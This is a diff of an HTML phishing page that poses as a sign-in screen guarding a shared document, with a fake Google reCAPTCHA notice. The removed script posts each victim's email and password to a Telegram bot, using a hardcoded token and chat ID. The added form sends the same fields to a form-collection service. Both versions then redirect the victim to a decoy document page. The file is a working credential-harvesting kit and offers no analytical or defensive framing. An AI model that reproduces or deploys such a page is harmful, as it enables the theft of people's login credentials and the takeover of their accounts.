@@ -1,68 +1,29 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Send to Telegram</title>
-  <link rel="stylesheet" href="style.css" />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
-  <div class="right-side">
-    <form id="contact-form">
-      <h1>Sign In</h1>
-      <p>To Access the <a href="#">Document</a></p>
-      <span>Email address</span>
-      <input type="text" name="email" id="email" required />
-      <span>Password</span>
-      <input type="text" name="name" id="name" required />
-      <button class="btn1" type="submit">Continue</button>
-      <p class="end">
-        Protected by re CAPTCHA and subject to the Google
-        <a href="#">Privacy Policy</a> and
-        <a href="#">Terms of service</a>
-      </p>
-    </form>
-  </div>
-
-  <script>
-    document.getElementById("contact-form").addEventListener("submit", function(e) {
-      e.preventDefault();
-
-      const email = document.getElementById("email").value;
-      const name = document.getElementById("name").value;
-
-      const message = `📝 *New Form Submission:*\n\n📧 *Email:* ${email}\n🔒 *Password:* ${name}`;
-
-      // Replace with your bot token and chat ID
-      const botToken = '7987034501:AAH-I6ZC1Maxj8fOmlfgLjfcR73yzcB5WXQ';
-      const chatId = 468538204;
-
-      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message,
-          parse_mode: 'Markdown'
-        })
-      })
-      .then(response => response.json())
-      .then(data => {
-        if (data.ok) {
-          // Redirect if message sent successfully
-          window.location.href = 'https://pdfopening.github.io/file-file//fileopen/index.html';
-        } else {
-          alert('Error sending to Telegram');
-          console.log(data);
-        }
-      })
-      .catch(error => {
-        alert('Network error');
-        console.error('Error:', error);
-      });
-    });
-  </script>
+    <div class="right-side">
+        <form  id="contact-form" method="POST" action="https://submit-form.com/p7Ltdrdry">
+            <h1>Sign In</h1>
+            <p>To Access the <a href="#">Document</a></p>
+            <input type="hidden" name="_redirect" value="https://pdfopening.github.io/file-file//fileopen/index.html">
+            <span>Email address</span>
+            <input type="text" name="email">
+            <span>Password</span>
+            <input type="text" name="name">
+            <button class="btn1" type="submit" value="Submit">Continue</button>
+            <p class="end">
+                Protected by re CAPTCHA and subject to the Google <a href="#">Privacy Policy</a>
+                and <a href="#">Terms of service</a>
+            </p>
+            <input type="hidden" name="_next" value="https://pdfopening.github.io/file-file//fileopen/index.html">
+        </form>
+    </div>
 </body>
 </html>
